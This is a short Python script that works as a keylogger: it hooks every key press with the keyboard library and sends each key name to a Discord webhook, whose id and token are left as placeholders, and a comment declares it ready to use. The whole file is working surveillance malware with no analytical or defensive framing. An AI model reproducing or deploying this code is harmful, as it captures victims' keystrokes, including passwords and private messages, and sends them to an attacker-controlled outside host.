import keyboard
import requests

url = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"

#********************AND YOU ARE READY TO GO********************#

def on_key_press(event):
    data = {
    "content":event.name
    }
    requests.post(url=url, data=data)
    
    
keyboard.on_press(on_key_press)
keyboard.wait()
